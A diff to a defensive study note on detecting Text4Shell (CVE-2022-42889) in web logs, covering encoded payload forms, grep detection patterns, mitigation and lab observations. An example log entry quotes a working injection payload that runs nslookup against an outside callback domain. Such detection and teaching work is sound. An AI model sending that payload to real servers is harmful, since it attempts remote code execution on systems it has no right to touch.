@@ -19,10 +19,10 @@ This section covers **Text4Shell (CVE-2022-42889)**, a critical vulnerability in
 
 ## 1. What is Text4Shell?
 
-- **Apache Commons Text** is a widely used Java library for string operations — substitution, lookups, matching, and similar helpers.
+- **Apache Commons Text** is a widely used Java library for string operations, substitution, lookups, matching, and similar helpers.
 - **Text4Shell** is a vulnerability in that library (disclosed **October 13, 2022**, **CVE-2022-42889**, reported by Álvaro Muñoz of GitHub Security Lab) that can lead to **remote code execution**.
 - **CVSS score: 9.8** (Critical).
-- Like Log4Shell, it isn't a program you attack directly. It's a flaw in a **library feature** — variable interpolation — so any application that passes **attacker-controlled text** into `StringSubstitutor` with the default configuration can be exposed.
+- Like Log4Shell, it isn't a program you attack directly. It's a flaw in a **library feature**, variable interpolation, so any application that passes **attacker-controlled text** into `StringSubstitutor` with the default configuration can be exposed.
 - **Affected versions:** Apache Commons Text **1.5 through 1.9** (inclusive). Fixed in **1.10.0**.
 
 **Impact of successful exploitation:** remote code execution, command execution with the application's privileges, data theft, and follow-on attacks (reverse shells, lateral movement).
@@ -45,7 +45,7 @@ Commons Text supports **string interpolation**: expressions in the form `${prefi
 3. The `script:` lookup **runs the embedded code**, or the `dns:` / `url:` lookup makes the server **connect out** to an attacker-controlled host.
 4. The attacker gets code execution, or at minimum an **out-of-band callback** confirming the target is vulnerable.
 
-**Where payloads appear:** any input fed into interpolation — most commonly a **URL parameter** (as in this lab), but also POST data or headers.
+**Where payloads appear:** any input fed into interpolation, most commonly a **URL parameter** (as in this lab), but also POST data or headers.
 
 ---
 
@@ -76,7 +76,7 @@ Payloads are usually **URL-encoded** so a plain text search misses them:
 | `%28` / `%29` | `(` / `)` |
 | `%27` | `'` |
 
-In the lab the encoding varied line to line — some requests encoded only the braces (`$%7bscript...`), others were **fully encoded** (`%24%7bdns%3a...`). Always decode before judging, and search case-insensitively.
+In the lab the encoding varied line to line, some requests encoded only the braces (`$%7bscript...`), others were **fully encoded** (`%24%7bdns%3a...`). Always decode before judging, and search case-insensitively.
 
 ---
 
@@ -84,7 +84,7 @@ In the lab the encoding varied line to line — some requests encoded only the b
 
 ### Key indicators
 - The interpolation pattern **`${script:`**, **`${url:`** or **`${dns:`** in any request field (URL, parameters, POST data, headers).
-- The string **`java.lang.Runtime.getRuntime`** or **`.exec(`** in request data — normal users never send this.
+- The string **`java.lang.Runtime.getRuntime`** or **`.exec(`** in request data, normal users never send this.
 - Encoded forms: `%24%7bscript`, `%24%7burl`, `%24%7bdns`, `$%7bscript`, etc.
 - **Unusual outbound DNS or HTTP connections** from the server to unknown domains, especially random-looking subdomains.
 - Repeated requests from one IP cycling through `script` / `url` / `dns` variants (automated tooling).
@@ -109,7 +109,7 @@ grep -iE 'java\.lang\.Runtime\.getRuntime|\.exec\(' access.log
 # 3. URL-encoded payloads
 grep -iE '%24%7b(script|url|dns)|\$%7b(script|url|dns)' access.log
 
-# 4. Broad search (decoded OR encoded) — review for false positives
+# 4. Broad search (decoded OR encoded) review for false positives
 grep -iE '\$\{(script|url|dns):|%24%7b(script|url|dns)|Runtime%2egetRuntime' access.log
 
 # 5. Which IPs are sending them?
@@ -117,14 +117,14 @@ grep -iE '\$\{(script|url|dns):|%24%7b(script|url|dns)' access.log \
   | awk '{print $1}' | sort | uniq -c | sort -rn
 ```
 
-> **Note:** the broad search can throw false positives (`url` / `dns` are common words), so confirm the full `${...}` structure. And a WAF or log match finds the **attempt** — it doesn't prove the server was exploited.
+> **Note:** the broad search can throw false positives (`url` / `dns` are common words), so confirm the full `${...}` structure. And a WAF or log match finds the **attempt**, it doesn't prove the server was exploited.
 
 ### Example nginx log entry 
 ```
 234.180.146.216 - - [11/Jul/2023:23:01:29 +0000] "GET /hello.php?name=${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup emerald170.messwithdns.com')} HTTP/1.1" 200 2984 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/114.0.5735.199 Safari/537.36"
 ```
 - A GET request to `/hello.php` with the payload in the **`name`** parameter.
-- The payload uses the `script:` lookup to run `nslookup` against **`emerald170.messwithdns.com`** — an out-of-band callback.
+- The payload uses the `script:` lookup to run `nslookup` against **`emerald170.messwithdns.com`** an out-of-band callback.
 - It is a **Text4Shell attempt** and an out-of-band confirmation channel.
 
 ### Did the attack succeed?
@@ -141,7 +141,7 @@ A `200` response doesn't prove success or failure on its own.
 ## 5. Mitigation
 
 For Text4Shell:
-- **Upgrade Apache Commons Text to 1.10.0 or later** — the fix removes the `script`, `dns` and `url` lookups from the default interpolator.
+- **Upgrade Apache Commons Text to 1.10.0 or later**, the fix removes the `script`, `dns` and `url` lookups from the default interpolator.
 - If you can't upgrade immediately, **configure `StringSubstitutor` with a safe lookup map** so those interpolators aren't available.
 - **Never pass untrusted input straight into interpolation.** Validate and sanitize anything that reaches `StringSubstitutor`.
 - Find **every** place Commons Text is used, including **transitive dependencies** (use an inventory or an SBOM).
@@ -175,20 +175,20 @@ For Text4Shell:
 - Read off the callback domain (after `nslookup`) and the parameter carrying the payload.
 
 **Observations**
-- The attacker sent the same attack **three ways** from the same IP — `${script:...}`, `${url:...}` and `${dns:...}` — all calling `nslookup emerald170.messwithdns.com`. Cycling through all three interpolators is a strong sign of **automated Text4Shell tooling** hedging against JDK/engine differences.
-- **Encoding varied** between requests: some encoded only the braces, one was fully URL-encoded (`%24%7bdns%3a...`). A plain search for `${dns:` would miss the fully-encoded line — decode first.
-- All the attack requests returned **`200`**, so the status code alone doesn't confirm exploitation — the DNS callback logs would.
+- The attacker sent the same attack **three ways** from the same IP, `${script:...}`, `${url:...}` and `${dns:...}` all calling `nslookup emerald170.messwithdns.com`. Cycling through all three interpolators is a strong sign of **automated Text4Shell tooling** hedging against JDK/engine differences.
+- **Encoding varied** between requests: some encoded only the braces, one was fully URL-encoded (`%24%7bdns%3a...`). A plain search for `${dns:` would miss the fully-encoded line, decode first.
+- All the attack requests returned **`200`**, so the status code alone doesn't confirm exploitation, the DNS callback logs would.
 
 ---
 
 ## Key takeaways
 
 - Text4Shell is **`${prefix:name}` interpolation in Apache Commons Text** reaching untrusted input, with `script` / `url` / `dns` as the dangerous default lookups.
-- The signature to hunt for is **`${script:`, `${url:`, `${dns:`** plus `java.lang.Runtime.getRuntime` — decoded **and** URL-encoded.
+- The signature to hunt for is **`${script:`, `${url:`, `${dns:`** plus `java.lang.Runtime.getRuntime` decoded **and** URL-encoded.
 - It's named after Log4Shell but is **much harder to exploit**: it needs the app to feed attacker input directly into `StringSubstitutor`.
 - A log match is an **attempt**. Confirm with **DNS and egress logs**, and check the JDK version for the `script:` vector.
 - The fix is **upgrading to Commons Text 1.10.0** and not interpolating untrusted input.
-- Cross-check course material: the course text had a **CVE typo** (`42899` in one spot; the correct ID is `42889`) — worth verifying identifiers against NVD.
+- Cross-check course material: the course text had a **CVE typo** (`42899` in one spot; the correct ID is `42889`) worth verifying identifiers against NVD.
 
 ## Skills practised
 
